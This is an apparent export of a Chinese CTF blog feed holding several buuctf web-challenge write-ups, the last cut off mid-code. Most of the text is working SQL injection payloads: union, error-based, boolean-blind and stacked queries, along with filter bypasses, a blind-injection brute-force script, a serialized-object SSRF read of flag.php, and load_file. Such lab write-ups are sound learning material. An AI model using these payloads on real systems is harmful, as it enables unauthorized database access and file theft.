        <content type="html"><![CDATA[<p>buuctf [网鼎杯 2018]Fakebook</p><span id="more"></span><p>日常访问robots.txt文件</p><p> robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。  </p><p>发现有个文件可以打开</p><p>附上源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个php写的类 然后用了curl</p><p>curl:<a href="https://blog.csdn.net/yangyu112654374/article/details/4658854">https://blog.csdn.net/yangyu112654374/article/details/4658854</a></p><p>然后发现有 <code>$output = curl_exec($ch)</code> 可以将类中<code>blog</code>重新构造用来执行ssrf漏洞</p><p><a href="https://xz.aliyun.com/t/11215">https://xz.aliyun.com/t/11215</a> 直接看大佬的总结</p><p>申请一个账号进入可以看到存在sql注入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344592.png" alt="img"> </p><p>判断是什么类型注入</p><p><code>no=1 and 1=1#</code> 可以</p><p><code>no=1 and 1=2#</code> 不行</p><p>说明这是数字注入</p><p><code>?no=0 order by 4#</code>  四列</p><p>报错注入(这里比较推荐报错 联合查询的话一开始找不到回显点 可能是我眼瞎)</p><p>其实是过滤了 <code>union select</code> 用<code>union/**/select</code> 绕过就行</p><p><code>1 and updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),3)#</code> 注意~ 不能用十六进制的 0x7e 这里有检测 用回原型好就行</p><p>[*] query error! (XPATH syntax error: ‘<del>fakebook</del>‘)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and updatexml(1,concat(&#x27;~&#x27;,select user(),&#x27;~&#x27;),3)# </span><br></pre></td></tr></table></figure><p>联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,database(),3,4#</span><br></pre></td></tr></table></figure><p>fakebook</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#x27;fakebook&#x27;#</span><br></pre></td></tr></table></figure><p>users</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;#</span><br></pre></td></tr></table></figure><p>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</p><p> <code>?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users#</code></p><p> 1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:”UserInfo”:3:{s:4:”name”;s:5:”admin”;s:3:”age”;i:1;s:4:”blog”;s:11:”<a href="http://www.123.com";}/">www.123.com&quot;;}</a></p><p> 利用ssrf漏洞 读取内容</p><p>构造类里的 blog属性值为 <code>s:29:&quot;file:///var/www/html/flag.php&quot;</code></p><p> 构造payload: <code>?no=-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;</code></p><p>得到base64码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s1MTkzODdkNS02OWQ2LTQ0OGEtYWQyZS0wODgxYmJkOThiNDl9IjsNCmV4aXQoMCk7DQo=</span><br></pre></td></tr></table></figure><?php$flag = "flag{519387d5-69d6-448a-ad2e-0881bbd98b49}";exit(0);法二：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1 union/**/select 1,load_file(&#x27;/var/www/html/flag.php&#x27;),3,4#</span><br></pre></td></tr></table></figure>之前看到用户是管理员 所以联想到用load_file函数去这里看https://www.cnblogs.com/junlebao/p/14104036.html]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> robots.txt </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> curl </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 32-[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
      <link href="/post/3b320c12.html"/>
      <url>/post/3b320c12.html</url>
      
        <content type="html"><![CDATA[<p>buuctf CISCN2019 华北赛区 Day2 Web1]Hack World</p><span id="more"></span><p>这道题是一道比较经典的布尔盲注的题目，也就全当作是学习了。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344880.png" alt="img"></p><p>题目表示flag在flag表里的flag字段里 这点就很可疑</p><p>输入 1，2都有正确的回显</p><p>输入<code>1&#39;</code>时显示</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344854.png" alt="img"></p><p>显示布尔（错误），这里就可以判断是布尔注入了</p><p>好好学习一下布尔盲注的知识：</p><p>这里有篇布尔盲注的的文章：<a href="https://blog.csdn.net/wangyuxiang946/article/details/123486880">https://blog.csdn.net/wangyuxiang946/article/details/123486880</a> 可以学习学习</p><p>substr(string,开始1，长度)函数 用于截取字符串的部分字符串</p><p>asscii() 用于将字符转化成ascii编码</p><p>这里本地搭了一个环节测试</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344816.png" alt="img"></p><p>在题目测试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr((select flag from flag),1,1))</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344111.png" alt="img"></p><p>发现被过滤了 fuzz一下哪些被过滤了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344901.png" alt="img"></p><p>发现一些常用的 空格 <code>or union</code> 都被过滤了 <code>/**/</code>绕过空格也被过滤了 所以只能用<code>()</code>来绕过</p><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(ascii(substr((select(flag)from(flag),1,1)))</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344886.png" alt="img"></p><p>正常回显了</p><p>这里再用到mysql 的if语句</p><p>if(条件，成功回显，失败回显)</p><p>本地测试</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344175.png" alt="img"></p><p>这是为什么条件等于84 是因为 我本地flag的第一个字母为T ascii编码为84</p><p>构造payload：<code>if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344201.png" alt="img"></p><p>成功回显 至于为什么是102 因为flag开头f 的ascii编码为102</p><p>那么就可以借助脚本，这里因为我python没怎么学，脚本不会写</p><p>但是整体脚本思路为 当匹配字符ascii 与题目相同时回显1 否则回显0 脚本根据题目回显的语句进行判断</p><p>然后遍历整个32-126 ascii编码字符</p><p>这里放一下大佬的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url=<span class="string">&#x27;http://4fdaca11-2d67-4dbe-b046-a42e64af5917.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">43</span>):</span><br><span class="line">    <span class="built_in">max</span>= <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line">        s = (<span class="built_in">int</span>)((<span class="built_in">max</span>+<span class="built_in">min</span>)/<span class="number">2</span>)</span><br><span class="line">        payload = <span class="string">&#x27;0^(ascii(substr((select(flag)from(flag)),&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;,1))&gt;&#x27;</span>+<span class="built_in">str</span>(s)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        r = requests.post(url,data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(r.content):</span><br><span class="line">            <span class="built_in">min</span>=s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=s</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">max</span>-<span class="built_in">min</span>)&lt;=<span class="number">1</span>):</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>以后有时间要滚去学习写写脚本了qwq</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344220.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 31-[GYCTF2020]Blacklist</title>
      <link href="/post/a8bde72c.html"/>
      <url>/post/a8bde72c.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [GYCTF2020]Blacklist</p><span id="more"></span><p>这道题又是一道学习的题目，打开看到界面ui很像一道堆叠注入的题目，刚好这道题也是用堆叠注入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345646.png" alt="img"></p><p>查字段：<code>1&#39; order by 3#</code></p><p><code>error 1054 : Unknown column &#39;3&#39; in &#39;order clause&#39;</code> 只有两列</p><p>这道题过滤了 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>不能用预编译 select 报错注入应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show databases#</span><br></pre></td></tr></table></figure><p>“supersqli”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show tables#</span><br></pre></td></tr></table></figure><p>“FlagHere”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show columns from FlagHere#</span><br></pre></td></tr></table></figure><p>直接用<code>1&#39;;desc FlagHere#</code>也可以</p><p>  string(4) “flag”</p><p>desc用法：</p><p>1.查表的详细信息  eg：<code>desc table_name;</code></p><p>2.desc降序排列数据  eg: <code>select select ename,sal from emp order by sal desc; </code></p><p>手动指定按照薪水由大到小排序（降序关键字desc）</p><p>然后这里用到了 mysql handler语句查询字段内的信息</p><p>这条语句使我们能够一行一行的浏览一个表中的数据</p><p>下面在本地搭了一个环境进行测试 如下：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345725.png" alt="img"></p><p>之后就可以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# </span><br></pre></td></tr></table></figure><p>成功</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345650.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> handler用法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 29-[GXYCTF2019]BabySQli</title>
      <link href="/post/b32b8b53.html"/>
      <url>/post/b32b8b53.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [GXYCTF2019]BabySQli</p><span id="more"></span><p>抓包发现一串密文：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346082.png" alt="img"></p><p><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code> 这是一串base32编码，base32编码特征是只有大写字母和数字</p><p>解密后：<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code> 这是一串base64编码，base64编码特点是有大小写字母和数字而且末尾常常是等于号</p><p>解码 得到：<code>select * from user where username = &#39;$name&#39;</code></p><p>意思是让我们从登录名进行注入</p><p>这个题目过滤了蛮多常用查询字符，可以bp抓包 fuzz一下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345905.png" alt="img"></p><p>显示419就是被河蟹的 415就是正常回显</p><p>过滤了 常用的<code>or``（）</code> 然后可以大写绕过</p><p>构造<code>1&#39; Order by 4#</code> 发现报错只有三列</p><p>这里再提供一种select查询爆字段的方法</p><p><code>select 1,2#</code> 报错 <code>select 1,2,3#</code> 正常回显也可以用来判断字段数</p><p>然后就不会了 看了其他大佬的wp</p><p>这里利用了一个mysql联合查询的特性：</p><p><strong>union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中</strong></p><p>具体可以看这篇大佬的详细wp：<a href="https://www.tqwba.com/x_d/jishu/272679.html">https://www.tqwba.com/x_d/jishu/272679.html</a></p><p>由于只能通过admin账户,因此让虚拟用户的名字是admin 同时密码转换成了md5存储(猜测应该是为了保护用户的隐私,md5不可逆,这就让即使身为管理员也不能知道用户密码)于是在构造的时候要注意数据库密码应该是md5模式的.同时登入时输入对应的明文密码即可。</p><p> 构造：<code>name=123&#39;union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;pw=1</code></p><p>其中 md5值为1的md5值，这里就是构造了 当后台检测<code>1 = md（1）</code>时为真 成功登录</p><p>其实就是 后台去查找符合密码为1的md5值  但是本来没有 我们利用联合查询特性构造了一个无中生有 于是能成功登录</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 联合查询特性 </tag>
            
            <tag> base32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 25-[极客大挑战 2019]HardSQL</title>
      <link href="/post/58b11103.html"/>
      <url>/post/58b11103.html</url>
      
        <content type="html"><![CDATA[<p>buuctf [极客大挑战 2019]HardSQ</p><span id="more"></span><p>这个题目是报错注入的典型，值得记录一下</p><p>简单尝试之后常见的字符比如空格 union都被黑名单了 尝试用&#x2F;**&#x2F;绕过空格但还是不行，只能用（）来绕过空格</p><p>这里测试空格是否被河蟹 不能通过1’加空格 这样测试是不对的</p><p>最好是用<code>1&#39; #</code>这样测试比较正确，因为一般题目不会河蟹#字符</p><p>空格绕过的原理： 括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格  </p><p>so 所以只能用报错注入了，这里就好好回顾一下报错注入</p><p>一般报错注入分为两个函数：updatexml() 与extractvalue()</p><p>就拿updatexml举例 他们两的差别就只是传参上</p><p><code>updatexml(1，2，3)</code>函数总共有三个参数，当第二个参数有特殊符号时，就会触发数据库报错，而且将参数2的内容显示在报错信息中，常用是<code>~</code>他的十六进制用<code>0x7e</code>表示</p><p>然后，报错注入常用拼接函数 concat和group_concat</p><p><code>concat</code>和<code>group_concat</code>都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，<code>concat</code>是针对以行数据做的拼接，而<code>group_concat</code>是针对列做的数据拼接，且<code>group_concat</code>自动生成逗号。</p><p>所以格式一般为：<code>updatexml(1,concat(0x7e,sql语句,0x7e),1)</code></p><p>然而，<code>extractvalue(1，2</code>)只有两个参数，当第二个参数具有特殊符号时，则会报错。</p><p>格式为：<code>extractvalue( 1,concat(0x7e,sql语句))</code></p><p>回到题目：</p><p>其实题目本身就是考察报错注入与绕过空格 这里就简单谢谢payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘<del>geek</del>‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘<del>H4rDsq1</del>‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘<del>id,username,password</del>‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘~1flagflag{9804c176-72e3-46d2-90’</p><p>这里flag显示的不完全，用到left 和 right函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346493.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346308.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure><p>XPATH syntax error: ‘~04c176-72e3-46d2-902b-0e79f4ea1’</p><p>查询到其余的flag</p><p>因为还河蟹了&#x3D; 所以用了like语句</p><p>完成！</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 报错注入 </tag>
            
            <tag> 空格绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf 22-admin</title>
      <link href="/post/b64980cf.html"/>
      <url>/post/b64980cf.html</url>
      
        <content type="html"><![CDATA[<p>buuctf  admin</p><span id="more"></span><p>这到题目有一个非预期，弱口令直接爆出来了，直接账号为admin，密码为123就能拿到flag，我还想这题怎么这么简单，看了别人的题解才发现又是一道学习的题目。</p><p>预期解：</p><p>先申请一个账号，抓包看到：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png" alt="img"></p><p>那么这道题的思路就是让我去登录管理员的账号就能拿到flag了，但是不知道密码</p><p>学习别人的wp：</p><p>在源码中发现一个github链接：<!-- https://github.com/woadsl1234/hctf_flask/ --></p><p>打开是一个flask项目，Flask是一个用Python编写的Web应用程序框架</p><p>比较重要的文件就是：</p><p>user.sql这是一个建数据库的文件</p><p>run.py 就是启动这个程序 把端口开放在互联网中</p><p>app文件中 routes.py 对应路由 非常重要 flask中就是一个一个路由组成的</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask import Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login import logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app import app, db</span><br><span class="line"><span class="keyword">from</span> config import Config</span><br><span class="line"><span class="keyword">from</span> app.models import User</span><br><span class="line"><span class="keyword">from</span> forms import RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"><span class="keyword">from</span> code import get_verify_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/code&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">get_code</span>():</span><br><span class="line">    image, code = <span class="title function_ invoke__">get_verify_code</span>()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = <span class="title function_ invoke__">BytesIO</span>()</span><br><span class="line">    image.<span class="title function_ invoke__">save</span>(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.<span class="title function_ invoke__">getvalue</span>()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = <span class="title function_ invoke__">make_response</span>(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">register</span>():</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    form = <span class="title function_ invoke__">RegisterForm</span>()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = <span class="title function_ 